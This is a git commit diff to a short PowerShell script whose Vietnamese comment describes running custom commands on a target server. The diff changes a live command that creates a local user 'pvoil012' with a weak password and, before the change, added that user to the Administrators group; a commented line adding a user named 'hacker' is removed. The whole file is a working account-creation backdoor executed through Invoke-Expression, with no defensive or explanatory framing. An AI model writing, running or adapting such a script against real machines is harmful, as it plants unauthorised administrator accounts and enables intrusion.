c0a2cfed717dd81fe4b822056f9dd121d437d4c6
BlueC <68144101+bluecrypt47@users.noreply.github.com>
2024-05-16 16:43:00 +0700

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,9 +1,8 @@
 # Script PowerShell để thực thi các lệnh tùy chỉnh trên máy chủ mục tiêu
 
 # Lệnh PowerShell cần thực hiện
-# $command = "net user hacker P@ssw0rd123 /add"  
 
-$command = "net user pvoil012 Password123 /add && net localgroup Administrators pvoil012 /add"
+$command = "net user pvoil012 Password123 /add"
 
 # Thực thi lệnh
 Invoke-Expression -Command $command
